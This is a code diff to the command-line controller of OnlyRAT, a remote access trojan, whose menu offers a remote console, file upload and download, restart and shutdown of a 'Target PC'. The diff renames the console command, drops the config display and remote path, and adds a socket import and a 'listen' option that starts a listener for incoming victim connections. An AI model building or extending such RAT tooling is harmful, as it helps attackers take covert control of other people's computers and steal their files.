@@ -5,6 +5,7 @@
 # imports
 import os
 import sys
+import socket
 import getpass
 import random as r
 from datetime import datetime
@@ -49,7 +50,7 @@ help_menu = """
 # option menu
 options_menu = """
         [+] Command and Control:
-            [orconsole] -------------- Remote Console
+            [console] -------------- Remote Console
             [upload] ----------------- Upload Files to Target PC
             [download] --------------- Download Files from Target PC
             [restart] ---------------- Restart Target PC
@@ -70,8 +71,7 @@ options_menu = """
 """
 username = getpass.getuser() # gets username
 header = f"[~] {username}@onlyrat $ " # sets up user input interface
-remote_path = "raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main" # url path for OnlyRAT files
-local_path = f"/home/{username}/.OnlyRAT" if username != "root" else "/root/.OnlyRAT" # gets path of OnlyRAT
+
 
 
 # clear screen
@@ -92,8 +92,6 @@ def current_date():
     current = datetime.now()    
 
     return current.strftime("%m-%d-%Y_%H-%M-%S")
-
-
 
 # connects rat to target
 def connect(address, password, port):
@@ -221,7 +219,6 @@ def remove():
     if option == "n":
         main()
 
-
 # command line interface
 def cli(arguments):
     # display banner
@@ -242,7 +239,7 @@ def cli(arguments):
             option = input(header)
             
             # remote console
-            if option == "orconsole":
+            if option == "console":
                 connect(ipv4, password, port)
             # custom upload
             elif option == "upload":
@@ -257,14 +254,13 @@ def cli(arguments):
             # shutdown target option
             elif option == "shutdown":
                 remote_command(ipv4, password, "shutdown", port)
+                
+            elif option == "listen":
+                start_listener(port)
             # help menu
             elif option == "help":
                 print(banner)
                 print(options_menu)
-            # display config file info
-            elif option == "config":
-                print_config(configuration)
-                print(f"USERNAME : {target_username}")
             
             # get version number
             elif option == "version":
